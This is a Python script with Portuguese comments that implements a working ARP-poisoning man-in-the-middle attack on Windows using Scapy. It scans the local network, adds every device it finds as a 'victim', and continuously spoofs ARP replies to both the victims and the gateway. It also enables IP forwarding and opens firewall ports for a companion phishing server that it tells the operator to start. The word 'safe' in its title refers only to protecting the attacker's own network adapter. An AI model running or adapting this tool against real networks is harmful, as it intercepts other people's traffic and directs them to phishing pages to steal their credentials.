"""
ARP MITM Seguro para Windows

Esta abordagem SEGURA:
1. Usa APENAS ARP spoofing (sem IP aliasing perigoso)
2. Habilita IP forwarding para rotear tráfego
3. Usa port forwarding para redirecionar porta 80
4. Tem cleanup robusto com múltiplos handlers

IMPORTANTE: Não adiciona IP do gateway na interface local,
evitando conflitos de IP que quebram a placa de rede.
"""

import sys
import time
import threading
import subprocess
import ctypes
import re
import atexit
import signal
from scapy.all import Ether, ARP, sendp, srp, sniff, conf, get_if_hwaddr
from scapy.arch.windows import get_windows_if_list

# =============================================================================
# CONFIGURAÇÕES
# =============================================================================

GATEWAY_IP = "192.168.18.1"
NETWORK_RANGE = "192.168.18.0/24"
PHISHING_PORT = 8080  # Porta do servidor de phishing (não 80 para evitar conflitos)
conf.verb = 0

# Variáveis globais
victims = {}
gateway_mac = None
victims_lock = threading.Lock()
running = True
selected_iface_guid = None
interface_name = None
my_mac = None
my_ip = None
cleanup_done = False  # Flag para evitar cleanup duplicado
ip_forwarding_original = None  # Estado original do IP forwarding


# =============================================================================
# UTILIDADES WINDOWS
# =============================================================================


def is_admin():
    """Verifica admin"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def get_interface_name():
    """Obtém o nome amigável da interface para uso com netsh"""
    global interface_name
    try:
        win_list = get_windows_if_list()
        for iface in win_list:
            if selected_iface_guid and iface.get("guid") in selected_iface_guid:
                interface_name = iface.get("name", "Ethernet")
                return interface_name

        result = subprocess.run(
            ["netsh", "interface", "ipv4", "show", "addresses"],
            capture_output=True,
            text=True,
        )
        lines = result.stdout.split("\n")
        current_iface = None
        for line in lines:
            if "Configuration for interface" in line:
                match = re.search(r'"([^"]+)"', line)
                if match:
                    current_iface = match.group(1)
            if my_ip and my_ip in line:
                interface_name = current_iface or "Ethernet"
                return interface_name

        interface_name = "Ethernet"
        return interface_name
    except Exception as e:
        print(f"[-] Erro ao detectar nome da interface: {e}")
        interface_name = "Ethernet"
        return interface_name


def enable_ip_forwarding():
    """Habilita IP forwarding no Windows (necessário para MITM)"""
    global ip_forwarding_original
    print("[*] Habilitando IP Forwarding...")
    try:
        # Salva estado original
        result = subprocess.run(
            ["netsh", "interface", "ipv4", "show", "global"],
            capture_output=True,
            text=True,
        )
        ip_forwarding_original = "enabled" in result.stdout.lower()

        # Habilita forwarding
        subprocess.run(
            ["netsh", "interface", "ipv4", "set", "global", "forwarding=enabled"],
            capture_output=True,
            check=True,
        )
        print("[+] IP Forwarding habilitado!")
        return True
    except Exception as e:
        print(f"[-] Erro ao habilitar IP Forwarding: {e}")
        return False


def disable_ip_forwarding():
    """Restaura IP forwarding ao estado original"""
    if ip_forwarding_original is False:
        print("[*] Desabilitando IP Forwarding...")
        try:
            subprocess.run(
                ["netsh", "interface", "ipv4", "set", "global", "forwarding=disabled"],
                capture_output=True,
                check=False,
            )
            print("[+] IP Forwarding desabilitado!")
        except Exception:
            pass


def add_firewall_rules():
    """Adiciona regras no firewall"""
    print("[*] Configurando firewall...")
    try:
        # Remove regras antigas
        subprocess.run(
            ["netsh", "advfirewall", "firewall", "delete", "rule", "name=ARPSpoof80"],
            capture_output=True,
        )
        subprocess.run(
            [
                "netsh",
                "advfirewall",
                "firewall",
                "delete",
                "rule",
                "name=ARPSpoofPhishing",
            ],
            capture_output=True,
        )

        # Adiciona novas regras
        subprocess.run(
            [
                "netsh",
                "advfirewall",
                "firewall",
                "add",
                "rule",
                "name=ARPSpoof80",
                "dir=in",
                "action=allow",
                "protocol=TCP",
                "localport=80",
            ],
            capture_output=True,
        )
        subprocess.run(
            [
                "netsh",
                "advfirewall",
                "firewall",
                "add",
                "rule",
                "name=ARPSpoofPhishing",
                "dir=in",
                "action=allow",
                "protocol=TCP",
                f"localport={PHISHING_PORT}",
            ],
            capture_output=True,
        )
        print("[+] Firewall configurado!")
        return True
    except Exception as e:
        print(f"[-] Erro firewall: {e}")
        return False


def remove_firewall_rules():
    """Remove regras do firewall"""
    try:
        subprocess.run(
            ["netsh", "advfirewall", "firewall", "delete", "rule", "name=ARPSpoof80"],
            capture_output=True,
        )
        subprocess.run(
            [
                "netsh",
                "advfirewall",
                "firewall",
                "delete",
                "rule",
                "name=ARPSpoofPhishing",
            ],
            capture_output=True,
        )
    except Exception:
        pass


# =============================================================================
# DESCOBERTA DE REDE
# =============================================================================


def get_best_interface():
    """Detecta a interface de rede"""
    print("[*] Detectando interface...")

    try:
        r = conf.route.route("8.8.8.8")
        iface_data = r[0]
        local_ip = r[1]

        if hasattr(iface_data, "name"):
            best_iface = iface_data.name
        elif hasattr(iface_data, "guid"):
            best_iface = iface_data.guid
        else:
            best_iface = str(iface_data)

        print(f"[+] Interface: {best_iface}")
        print(f"[+] IP Local: {local_ip}")

        return best_iface, local_ip

    except Exception as e:
        print(f"[-] Erro: {e}")
        return None, None


def get_mac(ip):
    """Obtém MAC via ARP"""
    try:
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        answered = srp(packet, timeout=2, verbose=False, iface=selected_iface_guid)[0]
        if answered:
            return answered[0][1].hwsrc
    except Exception:
        pass
    return None


def scan_network():
    """Escaneia a rede"""
    global gateway_mac

    print(f"[*] Escaneando {NETWORK_RANGE}...")

    gateway_mac = get_mac(GATEWAY_IP)
    if not gateway_mac:
        print("[-] ERRO: Gateway não respondeu!")
        return False
    print(f"[+] Gateway: {GATEWAY_IP} ({gateway_mac})")

    try:
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=NETWORK_RANGE)
        answered = srp(packet, timeout=3, verbose=False, iface=selected_iface_guid)[0]

        print("\n[+] Dispositivos encontrados:")
        for element in answered:
            ip = element[1].psrc
            mac = element[1].hwsrc

            if ip not in [GATEWAY_IP, my_ip]:
                with victims_lock:
                    victims[ip] = mac
                print(f"    -> {ip} ({mac})")

        print()
        return True

    except Exception as e:
        print(f"[-] Erro no scan: {e}")
        return False


# =============================================================================
# ARP SPOOFING
# =============================================================================


def spoof(target_ip, target_mac, spoof_ip):
    """Envia ARP falso"""
    try:
        packet = Ether(dst=target_mac, src=my_mac) / ARP(
            op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=my_mac
        )
        sendp(packet, verbose=False, iface=selected_iface_guid)
    except Exception:
        pass


def restore(target_ip, target_mac, source_ip, source_mac):
    """Restaura ARP"""
    try:
        packet = Ether(dst=target_mac, src=source_mac) / ARP(
            op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac
        )
        sendp(packet, count=4, verbose=False, iface=selected_iface_guid)
    except Exception:
        pass


def poison_worker():
    """Thread de ARP poisoning"""
    global running
    packets_sent = 0

    print("[*] Thread de ARP Poisoning: Ativa")

    while running:
        with victims_lock:
            if victims and gateway_mac:
                for victim_ip, victim_mac in victims.items():
                    # Vítima pensa que EU sou o gateway
                    spoof(victim_ip, victim_mac, GATEWAY_IP)
                    # Gateway pensa que EU sou a vítima
                    spoof(GATEWAY_IP, gateway_mac, victim_ip)
                    packets_sent += 2

                print(
                    f"\r[ARP] Pacotes: {packets_sent} | Alvos: {len(victims)}",
                    end="",
                    flush=True,
                )

        time.sleep(1)


def arp_monitor(pkt):
    """Monitora novos dispositivos"""
    if pkt.haslayer(ARP) and pkt[ARP].op == 1:
        src_ip = pkt[ARP].psrc
        src_mac = pkt[ARP].hwsrc

        if src_ip not in [my_ip, GATEWAY_IP, "0.0.0.0"]:
            with victims_lock:
                if src_ip not in victims:
                    print(f"\n[+] Novo: {src_ip} ({src_mac})")
                    victims[src_ip] = src_mac


# =============================================================================
# LIMPEZA
# =============================================================================


def cleanup():
    """Limpa tudo ao sair - robusto com flag para evitar duplicação"""
    global running, cleanup_done

    if cleanup_done:
        return
    cleanup_done = True
    running = False

    print("\n\n[*] Restaurando configurações...")

    # Restaura ARPs das vítimas
    with victims_lock:
        if victims and gateway_mac:
            for victim_ip, victim_mac in victims.items():
                restore(victim_ip, victim_mac, GATEWAY_IP, gateway_mac)
                restore(GATEWAY_IP, gateway_mac, victim_ip, victim_mac)
                print(f"    -> {victim_ip} restaurado")

    # Restaura IP forwarding ao estado original
    disable_ip_forwarding()

    # Remove regras do firewall
    remove_firewall_rules()

    print("[+] Limpeza concluída com sucesso!")


def signal_handler(signum, frame):
    """Handler para sinais de término"""
    print(f"\n[!] Sinal {signum} recebido, iniciando cleanup...")
    cleanup()
    sys.exit(0)


# =============================================================================
# MAIN
# =============================================================================

if __name__ == "__main__":
    print("=" * 60)
    print("     ARP MITM Seguro - Sem IP Aliasing")
    print("=" * 60)
    print()
    print("[!] Esta versão usa IP Forwarding ao invés de IP Aliasing")
    print("[!] Isso evita conflitos de IP que quebram a placa de rede")
    print()

    if not is_admin():
        print("[-] ERRO: Execute como Administrador!")
        sys.exit(1)

    # Registra handlers de cleanup PRIMEIRO
    atexit.register(cleanup)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # No Windows, SIGBREAK é enviado por Ctrl+Break
    if hasattr(signal, "SIGBREAK"):
        signal.signal(signal.SIGBREAK, signal_handler)

    # Detecta interface
    selected_iface_guid, my_ip = get_best_interface()
    if not selected_iface_guid:
        print("[-] Interface não detectada")
        sys.exit(1)

    # MAC local
    try:
        my_mac = get_if_hwaddr(selected_iface_guid)
        print(f"[+] Meu MAC: {my_mac}")
    except Exception as e:
        print(f"[-] Erro MAC: {e}")
        sys.exit(1)

    # Habilita IP Forwarding (substitui o perigoso IP Aliasing)
    if not enable_ip_forwarding():
        print("[-] AVISO: IP Forwarding pode não estar funcionando")
        print("    O tráfego pode não ser roteado corretamente")

    # Configura firewall
    add_firewall_rules()

    # Escaneia rede
    if not scan_network():
        print("[!] Continuando sem alvos...")

    # Inicia poisoning
    poison_thread = threading.Thread(target=poison_worker, daemon=True)
    poison_thread.start()

    print()
    print("=" * 60)
    print(" ATENÇÃO: Agora inicie o servidor de phishing:")
    print(f"   python tests/router_phishing.py --port {PHISHING_PORT}")
    print()
    print(" Com IP Forwarding, você precisa de port forwarding adicional")
    print(" ou configurar o phishing server corretamente.")
    print("=" * 60)
    print()
    print("[*] Monitorando ARP... (Ctrl+C para sair com segurança)")
    print()

    try:
        sniff(filter="arp", prn=arp_monitor, iface=selected_iface_guid, store=0)
    except KeyboardInterrupt:
        pass
    finally:
        cleanup()
